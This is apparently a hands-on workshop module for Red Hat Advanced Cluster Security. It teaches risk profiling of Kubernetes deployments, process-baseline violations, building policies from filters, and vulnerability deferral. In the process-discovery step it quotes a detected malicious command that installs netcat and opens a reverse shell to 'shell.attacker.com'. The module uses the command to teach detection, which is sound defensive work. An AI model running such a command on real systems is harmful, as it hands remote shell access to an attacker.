= Risk Profiling

== Module goals

* Understand the addition configuration challenges of Kubernetes
* Tie vulnerability management details together with configuration details and runtime events
* Help you identify "Risk" in your clusters

== The Configuration Management Tab

The configuration management tab contains a lot fo useful information that directs you to other dashboards. It is currently undergoing an overhaul, and the RHACS team is looking for feedback. 

Here are the four top use cases that we tend to see from people looking into security configuration management.

- Policy Violations
- CIS Kubernetes 1.5
- Users with most cluster admin roles
- Secrets most used across deployments

Let's break down each section. 

=== The "Secrets most used across deployments" widget

*Procedure*

image::03-cm-02.png[link=self, window=blank, width=100%]

[start=1]
. Click the *View all* button on the "Secrets most used across deployments" widget.

With this view, you can analyze how secrets are being used in your cluster. Secrets can be filtered and the data exported to a CSV file. However, you will not get ALL of the secrets this way. We recommend using the API to export large batches of data.

[start=2]
. Run the following shell command.

[source,sh,subs="attributes",role=execute]
----
curl -k X GET "https://$ROX_CENTRAL_ADDRESS:443/v1/secrets" -H "Authorization: Bearer $ROX_API_TOKEN" -H "Content-Type: application/json" | jq
----

[.console-output]
[source,json,subs="+macros,+attributes"]
----
...
      "name": "tpa-infrastructure-kafka-user-passwords",
      "clusterId": "86eede55-7414-4f42-809a-f978a48d8213",
      "clusterName": "production",
      "namespace": "trusted-profile-analyzer",
      "types": [
        "UNDETERMINED"
      ],
      "createdAt": "2024-10-01T04:00:55Z"
    }
  ]
}
----

NOTE: Some deployments will have "UNDETERMINED" and others will have "PUBLIC_CERTIFICATE" and "CERT_PRIVATE_KEY". 

[start=3]
. Next, in the Secrets view, filter the secrets by *Cluster: production* & *Image Pull Secret Registry: quay.io*

image::03-cm-03.png[link=self, window=blank, width=100%]

[start=4]
. Next, try filtering by "Secret Type."

IMPORTANT: Not all secrets are the same, and organizations should ensure secrets are properly managed through a link:https://docs.openshift.com/container-platform/4.15/storage/container_storage_interface/persistent-storage-csi-secrets-store.html[CSI driver] or a secrets management tool.

> What processes do you have in place to limit unneeded secrets in your environments?

=== The "Policy violations by severity" widget

The policies entity list in the Configuration Management UI gives you a complete overview of all of the policies in the cluster, the policy status, whether it's disabled, whether it's enabled, and whether it's enforced or unenforced.

image::03-cm-04.png[link=self, window=blank, width=100%]

*Procedure*

. Click the *3 rated as critical* button on the "*Policy violations by severity*" widget.

image::03-cm-05.png[link=self, window=blank, width=100%]

IMPORTANT: Notice that no policy is enforce. By default, in RHACS, there is no policy that is being enforced avoiding the eviction of any workloads prematurely and allows you to ingest all of this security information at the beginning of your security journey.

> In a break glass scenario, you can enforce these policies quickly. 

[start=2]
. Click the *Apache Struts: CVE-2017-5638* policy

image::03-cm-05.png[link=self, window=blank, width=100%]

> Here we can see all of the deployments currently violating this policy

[start=3]
. Click the *View policy* in the top right of the screen.

image::03-cm-06.png[link=self, window=blank, width=100%]

> From this page you can tak "action" by editing the policy to enforce blocking behavior in the build and deploy phase so no new images with the vulnerability will be pushed onto the cluster

== Risk in RHACS

The number of detected vulnerabilities can be overwhelming for those new to security. To manage risk effectively, you need to consider runtime, security configuration, and vulnerability data together. This helps you assess the potential harm and prioritize which vulnerabilities to fix, rather than just deferring them.

RHACS evaluates risk across your environment, ranking deployments based on their security risk. It also highlights vulnerabilities, configurations, and runtime activities that need immediate attention. RHACS helps you understand how deployment configurations and runtime activities affect the chances and success of an exploit, guiding you in prioritizing actions to take.

Since not all risks can be addressed at once, RHACS helps organizations focus on the most important ones.

=== View Risks by Deployment

In this section, you look at the complete view of the risks by deployments in all the clusters of your system.

This list view shows all deployments in all clusters and namespaces, ordered by risk priority. A multi-factor risk metric sorts deployments based on policy violations, image contents, deployment configuration, and other similar factors. Deployments at the top of the list present the most risk.

.Procedure
. From the left navigation menu, select the *Risk* tab:

image::04-risk-01.png[link=self, window=blank, width=100%]

[start=2]
. Click the `visa-processor` deployment to bring up the *Risk Details* panel, with the *Risk Indicators* tab selected:

image::04-risk-02.png[link=self, window=blank, width=100%]

The *Risk Indicators* tab shows why this deployment is highly risky. The deployment has serious, fixable vulnerabilities, but it also has configurations such as service exposure outside the cluster, making it more likely to be attacked. In addition, other configurations, such as privileged containers, mean that a successful attacker has access to the underlying host network and file system, including other containers running on that host.

> What is the *"Riskiest deployment"*? Why do you think it was rated that way?

[start=3]
. Navigate to the bottom of the *Risk Indicators* page and take a minute to review the *Components Useful for Attackers* section.

image::04-risk-03.png[link=self, window=blank, width=100%]

NOTE: The configuration details are automatically pulled by RHACS from OpenShift and Kubernetes distrobutions, risk score is applied to each factor, making the risk report immediately available as soon as you start running RHACS.

This "visa-processor" image is highly insecure in the service configuration section. The container has;

* SYS_ADMIN capabilities
* Port 22 is exposed in an unknown manner
* components such as app bash curl and wget are available
* Apache Struts is present in the image

This means that if successful, the attacker will have significant control over the system.

[start=4]
. Navigate to the deployment details

image::04-risk-04.png[link=self, window=blank, width=100%]

Here, we see a complete breakdown of the deployment details, including the container configuration, the mounted secrets, the image name, specific commands, and the security context of the container, which is privileged.

The deployment details help you understand who and what is responsible for this workload 

[start=5]
. Next, click on the *Process Discovery* Tab

image::04-risk-05.png[link=self, window=blank, width=100%]

This tab displays all the running processes in the container. You can see that a baseline of processes has already been established, and a few violations of that baseline have been detected. The baseline is a list of the processes currently running, and alerts are triggered if RHACS detects new processes not included in the baseline.

If you scroll to the bottom of the page, you can remove these processes from the baseline by clicking the - sign. Once locked in, you can craft alerts for anomloies and non-baseline activity. 

[start=6]
. Click the drop-down arrow next to `/bin/bash` to reveal the specific context that triggered this violation

image::04-risk-06.png[link=self, window=blank, width=100%]

[start=7]
. Review the command...

`-c /usr/bin/sudo /usr/bin/apt-get -y install netcat; /usr/bin/sudo /bin/nc shell.attacker.com 9001 -e /bin/bash`.

> Does this qualify as anamoulous behavior? is this behavior normal in a contatiner?

[start=8]
. Click the *View Graph* in the header bar to call up the *Event Timeline*.

image::04-risk-07.png[link=self, window=blank, width=100%]

image::04-risk-08.png[link=self, window=blank, width=100%]

The event timeline shows for each pod the process activity that has occurred over time. It has the visa-processor and visa-processor-sidecar information in the interface.

[start=9]
. Click the squares or circles for the process activity.

image::04-risk-07.png[link=self, window=blank, width=100%]
image::04-risk-08.png[link=self, window=blank, width=100%]

While RHACS monitored baseline activity, it detected a few policy violations from the container. 

[start=10]
. Click the blue dot to view the flagged issues.

image::04-risk-09.png[link=self, window=blank, width=100%]

> Here, the netcat command was run well after container startup and a Shell Spawned by Java Application policy was violated. These actions should yield a response.

== Find and create policies quickly with filters

In the Risk view and most UI pages, RHACS includes a filter bar at the top that allows you to narrow the reporting view based on matching or non-matching criteria. Almost all of the attributes that RHACS gathers are filterable. This is particularly useful in the Risk view when you're looking for specific information, such as, 'Which applications have `bash` present?'

You can create new security policies based on the filtering criteria selected in the Risk dashboard. However, when creating new security policies from the `Risk` view using the selected criteria, not all requirements are automatically applied to the new policy.

*Procedure*

. Go to the "Risk" dashboard.
. Enter `Process Name` in the filter bar (where it reads `Add one or more resource filters`) and select the *Process Name* key.
. Enter `bash` and then press *Enter*.

image::04-risk-10.png[link=self, window=blank, width=100%]

NOTE: Several deployments are shown to have run `bash`. This behavior may be a threat or it could be normal behavior.

> RHACS transforms the filtering criteria into policy criteria by converting the cluster, namespace, and deployment filters to equivalent policy scopes.

[start=4]
. From the Risk dashboard filter by Process Name *THEN* apt or apt-get or dpkg to the search bar
. Next add Namespace *THEN* payments

IMPORTANT: What deployments did you expect to see?

image::05-policy-0.png[link=self, window=blank, width=100%]


[start=6]
. Click the *+ (Create Policy)* next to the filter bar 

image::05-policy-1.png[link=self, window=blank, width=100%]

[start=7]
. Give the policy all of the necessary information and complete the required fields then hit next.

* *Name*: `No apt-get allowed`
* *Severity*: `High`
* *Categories*: `Anomalous Activity`
* *Description*: `No package managers allowed`
* *Rationale*: `Privilege escalation technique`
* *Guidance*: `Uninstall during container build`
* *MITRE ATT&CK*: `(Optional) The policy can be mapped to a MITRE ATT&CK technique.`
* *Lifecycle stages*: `Runtime`
* *Event sources*; `Deployment`
* *Rules*: Process activity -> Process Name -> apt-get
* *Activation state*: Enable 
* *Response method*: `Inform`
* *Inform and enforce*: `Enform on Runtime`

Make sure to preview the policy before accepting it. 

=== Advanced Filtering

You can write more advanced filters focusing on particular scopes to detect vulnerabilities more accurately. Local page filtering on the *Risk* view combines the search terms by using the following methods:

* Combines the search terms within the same category with an `OR` operator. For example, if the search query is `Cluster:A,B` the filter matches cluster `A` or cluster `B` deployments.

* Combines the search terms from different categories with an `AND` operator. For example, if the search query is `Cluster:A+Namespace:Z`, the filter matches deployments in cluster `A` and in namespace `Z`.

When you add multiple scopes to a policy, the policy matches violations from any of the scopes. For example, if you search for `(Cluster A OR Cluster B) AND (Namespace Z)` it results in two policy scopes, `(Cluster=A AND Namespace=Z)` OR `(Cluster=B AND Namespace=Z)`.

== What would you do?

* What filters would be useful in your day-to-day risk workflow? 
* How would you scope your filters by team/application/cluster?

Try some of these scopes yourself by indicating different namespaces in your filters.

== Risk Acceptance workflow 

As a security analyst who is a deferral approver, you can evaluate requested deferrals and respond to them through the RHACS portal. In this section we will review a deferral process in RHACS.

.Procedure
. Head to the Vulnerability Management -> Workload CVE.

image::04-risk-015.png[link=self, window=blank, width=100%]

[start=2]
. Select any vulnerability that you want to defer. Click the 3 dots on the right hand side of the tab -> select defer.
. Pick a timeline for deferral, and decide whether the vulnerability should be ignored in all images or only this one. 
. Give the deferral a rationale 
. Click "Submit request"

image::04-risk-017.png[link=self, window=blank, width=100%]

IMPORTANT: The output gives you all of the investigation information including a link that you can send out to teammates who can review your investigation. 

image::04-risk-018.png[link=self, window=blank, width=100%]

|====
There will be a "Pending Exception" icon in the dashboard to mark that a deferral has been requested.
|====

[start=7]
. Click on the *Pending exception* icon

You should be brought to the *Exception Management* page. Here is where you, and others, can find all of the information about the vulnerability deferral. 

image::04-risk-019.png[link=self, window=blank, width=100%]


[start=8]
. Decide how you want to handle the deferral by click your newly created request and selecting an option. 

image::04-risk-020.png[link=self, window=blank, width=100%]


The Exception Management bar will show all pending vulnerability related requests.

IMPORTANT: While you can mute notifications or a CVE you can never hide them in RHACS. 

== What would you do?

- How does your organization manage security policies? 
- How will you use this dashboard to review your security posture?
- What types of security configuration controls are you putting in place in your OpenShift and Kubernetes Clusters?
- How would you make changes to your clusters?

Great job!! 

RHACS does not simply surface vulnerabilities. You learned the various risk priority justifications RHACS provides and filtered and searched through these vulnerabilities. RHACS reports the risk indicators, deployment details, and processes necessary to discover vulnerabilities for each deployment.

Have fun with *Policy Management*!
